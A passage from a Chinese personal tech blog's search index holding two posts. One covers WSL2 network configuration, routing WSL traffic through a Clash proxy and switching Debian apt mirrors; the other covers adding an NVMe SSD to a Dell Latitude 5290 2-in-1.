5.15.153.1-microsoft-standard-WSL2 x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br></pre></td></tr></table></figure><h2 id="四、-wslconfig文件设置"><a href="#四、-wslconfig文件设置" class="headerlink" title="四、.wslconfig文件设置"></a>四、.wslconfig文件设置</h2><ul><li><p>进入<code>C:/Users/Username/</code>目录，如果当前目录不存在名为<code>.wslconfig</code>的文件，则手动创建一个。</p></li><li><p>用记事本打开<code>.wslconfig</code>文件并输入以下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">autoMemoryReclaim=gradual  </span><br><span class="line">networkingMode=mirrored</span><br><span class="line">dnsTunneling=<span class="literal">true</span></span><br><span class="line">firewall=<span class="literal">true</span></span><br><span class="line">autoProxy=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ul><p>这个操作之后可以使用<code>ip addr</code>命令查看ip地址并和在<code>powershell</code>中输入<code>ipconfig</code>后的地址进行对比，如若一样则网络模式修改成功。此外，上面的功能是Windows内部版本19041及更高版本中作为wsl2运行的发行版特有的，可以自行去看官网以了解更多功能<a href="https://learn.microsoft.com/en-us/windows/wsl/wsl-config#configuration-options">WSL配置</a>。</p><h3 id="clash接管wsl2网络"><a href="#clash接管wsl2网络" class="headerlink" title="clash接管wsl2网络"></a>clash接管wsl2网络</h3><p>让clash接管wsl的网络，需要先在clash中打开<code>Allow LAN</code>功能。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/clash1.png" alt="clash"></p><h4 id="方案一-你能使用wsl2的实验性功能"><a href="#方案一-你能使用wsl2的实验性功能" class="headerlink" title="方案一(你能使用wsl2的实验性功能)"></a>方案一(你能使用wsl2的实验性功能)</h4><p>确保上述的操作无误，输入<code>wget www.google.com</code>来确认clash确实已经接管了wsl的网络(此操作需要在Linux的不需要root写权限的目录下进行)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget www.google.com</span><br><span class="line"></span><br><span class="line">--2025-01-21 22:18:49--  http://www.google.com/</span><br><span class="line">Connecting to 127.0.0.1:7890... connected.</span><br><span class="line">Proxy request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [text/html]</span><br><span class="line">Saving to: ‘index.html’</span><br><span class="line"></span><br><span class="line">index.html                        [ &lt;=&gt;                                              ]  19.35K  --.-KB/s    <span class="keyword">in</span> 0.05s</span><br><span class="line"></span><br><span class="line">2025-01-21 22:18:49 (376 KB/s) - ‘index.html’ saved [19818]</span><br></pre></td></tr></table></figure><h4 id="方案二-你不能使用wsl2的实验性功能"><a href="#方案二-你不能使用wsl2的实验性功能" class="headerlink" title="方案二(你不能使用wsl2的实验性功能)"></a>方案二(你不能使用wsl2的实验性功能)</h4><p>这里借鉴了某<a href="https://eastmonster.github.io/2022/10/05/clash-config-in-wsl/">大神</a>的方案，若你的wsl版本或者windows版本不能使用上面的配置，将<code>.wslconfig</code>中的内容改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">dnsTunneling=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>之后编辑Linux根目录下的<code>.bashrc</code>文件，加入以下三行内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">host_ip=$(<span class="built_in">cat</span> /etc/resolv.conf |grep <span class="string">&quot;nameserver&quot;</span> |<span class="built_in">cut</span> -f 2 -d <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br></pre></td></tr></table></figure><p>这里的端口就是clash的port，如上面我的截图中clash的端口是7890(一般默认就是7890)。完成后输入<code>source ~/.bashrc</code>来让配置生效，可以输入<code>echo $http_proxy</code>来验证是否成功。</p><h2 id="五、更换软件源"><a href="#五、更换软件源" class="headerlink" title="五、更换软件源"></a>五、更换软件源</h2><p>根据你使用的Linux发行版直接上网搜索相应的镜像源即可，这里给出一个汇总链接<a href="https://segmentfault.com/a/1190000000375848">镜像源</a>。复制相应的镜像源后，直接进行修改即可。这里以debian12更换清华源为例。</p><ul><li><p>访问<a href="https://mirrors.tuna.tsinghua.edu.cn/help/debian/">debian清华镜像源</a>(网址中的debian可换成你的Linux发行版)并复制软件源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换</span></span><br><span class="line">deb https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span></span><br></pre></td></tr></table></figure></li><li><p>备份文件并修改文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份源文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line"><span class="comment"># 修改文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">touch</span> /etc/apt/sources.list</span><br><span class="line"><span class="built_in">sudo</span> vi /etc/apt/sources.list <span class="comment"># 将复制内容粘贴进去 </span></span><br></pre></td></tr></table></figure><p>相信vim操作就不用教了吧，这里也可以使用你更熟悉的编辑器进行修改。</p></li></ul><p>最后输入<code>sudo apt update</code>和<code>sudo apt upgrade</code>命令即可验证软件源是否修改成功。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 教程 </tag>
            
            <tag> WSL2 </tag>
            
            <tag> Windows11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DELL Latitude 5290 2in1扩展硬盘避坑</title>
      <link href="/post/4a17b156.html"/>
      <url>/post/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>PS：写这篇文章的原因是我在扩展这个平板的硬盘时就踩过坑，而且关于这台平板的文章在网上非常少且有些错误的地方。</p><p>自从需要带着电脑出去干活的频率升高后就一直想搞个win平板玩玩，主要是方便带着出门加轻度办公<del>（其实主要原因是方便玩旮旯给木）</del>。为什么要选择傻多戴呢，无他，就是因为可以扩展硬盘而且二手也不贵（某鱼上1000多一点带键盘拿下，基本上是全新）。</p><h2 id="关于硬盘位"><a href="#关于硬盘位" class="headerlink" title="关于硬盘位"></a>关于硬盘位</h2><p>关于大家最关心的扩展位硬盘的问题，这个硬盘位是wwan口，<strong>不支持sata协议，只支持nvme协议 pcie3.0，并且需要双缺口（B&amp;M key）的硬盘才能插得进去</strong>。规格我选择的是2242的（是短硬盘，平时大家看得多的长硬盘是2280规格的），2230的没试过，貌似也是可以的（别人有成功过）。根据硬盘的螺丝定位口来看，2242是刚刚好的。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post1/ae270d110612862760e6b359d714f10a429931853.jpg" alt="硬盘展示"></p><h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><p>测速大家自己看吧<del>（主硬盘位商家给了一根sata协议的好黑心）</del><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post1/e29d3ea9d3e14ea0f3912cba53f352ac429931853.png" alt="测速展示"></p><p>在这里纠正一点，在别的文章有看到过把ngff和nvme放在一起说的，而实际上ngff和nvme不是并列关系，ngff（Next Generation Form Factor）就是m.2的前称，而nvme是一种传输协议。</p>]]></content>
      
      
      
        <tags>
            
            <tag> DELL </tag>
            
            <tag> 搞机 </tag>
            
            <tag> win平板 </tag>
            
            <tag> 避坑 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
